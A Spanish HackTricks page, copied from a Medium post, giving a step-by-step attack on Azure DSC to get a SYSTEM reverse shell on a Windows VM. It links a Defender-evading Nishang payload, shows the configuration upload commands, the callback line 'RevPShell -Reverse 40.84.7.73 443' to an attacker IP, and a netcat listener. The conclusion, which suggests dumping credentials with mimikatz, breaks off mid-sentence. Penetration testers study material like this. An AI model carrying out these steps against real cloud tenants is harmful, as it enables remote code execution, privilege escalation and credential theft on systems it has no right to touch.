# Az - Estado de Configuraci√≥n RCE

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

**Este post fue copiado de** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Preparaci√≥n de la infraestructura del servidor remoto (C2) <a href="#f0fa" id="f0fa"></a>

Voy a alojar una versi√≥n reducida de la carga √∫til Nishang Invoke-PowerShellTcp.ps1 desde el servidor remoto "40.84.7.74", que es la caja Kali. El nombre de la carga √∫til ser√° "RevPS.ps1". Para evitar que el script de Nishang sea eliminado por Windows Defender por cualquier motivo (tal vez prefieras dejar caer el archivo en el disco) tengo una versi√≥n ligera aqu√≠ que puedes usar que evitar√° Defender: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1). Esto ser√° alojado por un simple servidor Python Simple en la caja Kali.

### Paso 1 ‚Äî Crear archivos <a href="#89de" id="89de"></a>

Necesitaremos crear otro archivo de configuraci√≥n DSC. Se puede descargar una plantilla aqu√≠: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1). Este archivo de configuraci√≥n utilizar√° la misma funci√≥n de escritura de archivos que utilizamos anteriormente. Esta vez, el contenido incluye c√≥digo para descargar y ejecutar una carga √∫til desde nuestro servidor remoto. Adem√°s, estamos utilizando una funci√≥n de tarea programada disponible en el m√≥dulo _ComputerManagementDsc_. La funci√≥n de tarea programada ser√° el papel clave en la ejecuci√≥n y nos proporcionar√° privilegios de SYSTEM m√°s adelante.

Tambi√©n descargaremos un script que se utilizar√° para publicar nuestra configuraci√≥n en la VM. Esto se encuentra aqu√≠: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).

Estos archivos servir√°n como plantilla. **Deber√°s completar los nombres de variables y par√°metros con lo que est√°s usando**. Esto incluye los nombres de recursos, las rutas de archivos y los nombres de servidores externos/cargas √∫tiles que est√°s utilizando. Por favor, consulta los comentarios en el c√≥digo.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Paso 2 ‚Äî Comprimir archivo de configuraci√≥n <a href="#c2c2" id="c2c2"></a>

Con nuestros dos archivos creados, comprimiremos el archivo **'reverse\_shell\_config.ps1'** para que pueda ser enviado a la cuenta de almacenamiento

```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```

<figure><img src="../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### Paso 3 ‚Äî Establecer contexto de almacenamiento y cargar <a href="#bed9" id="bed9"></a>

Nuevamente, configuraremos el contexto de nuestra cuenta de almacenamiento, que ya he hecho. Ya tengo un contenedor llamado '**azure-pentes**t', as√≠ que aqu√≠ es donde publicar√© el m√≠o:

```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```

<figure><img src="../../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

### Paso 4 ‚Äî Preparar la caja Kali <a href="#20fb" id="20fb"></a>

En nuestra caja Kali, simplemente podemos _wget_ nuestra carga √∫til de PowerShell. El script de reverse-shell sin formato se encuentra aqu√≠: [https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1).

```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```

<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

Necesitamos editar el script de reverse-shell agregando nuestros par√°metros, para que la VM de Windows sepa d√≥nde conectarse una vez que se ejecute. En mi caso, agrego lo siguiente:

```
RevPShell -Reverse 40.84.7.73 443
```

<figure><img src="../../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

### Paso 5 ‚Äî Publicar archivo de configuraci√≥n <a href="#9ad6" id="9ad6"></a>

Ahora ejecutaremos nuestro archivo de configuraci√≥n. Lo tengo configurado para que se publique en el escritorio para una mejor visualizaci√≥n, pero se puede publicar en cualquier lugar. ¬°Despu√©s de un par de minutos, veremos que el script de reverse-shell ha sido publicado!

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Paso 6 ‚Äî Alojar carga √∫til y configurar el oyente <a href="#c55f" id="c55f"></a>

Una vez que publiquemos la configuraci√≥n, podemos iniciar simult√°neamente un servidor Python SimpleHTTPServer sobre el puerto 80 para alojar la carga √∫til, junto con un oyente netcat para capturar la conexi√≥n:

```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```

¬°Vemos que la tarea programada se ha ejecutado y nuestra carga √∫til se ha recuperado y ejecutado en memoria con privilegios de **SYSTEM**!

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### Conclusi√≥n <a href="#1ec2" id="1ec2"></a>

Esto ahora abre la puerta a muchas posibilidades. Como tenemos una shell en ejecuci√≥n como **SYSTEM**, podemos volcar credenciales con mimikatz (potencialmente arriesgado dependiendo de lo maduro que sea el EDR para los recursos en la nube). Si se descargan credenciales, hay una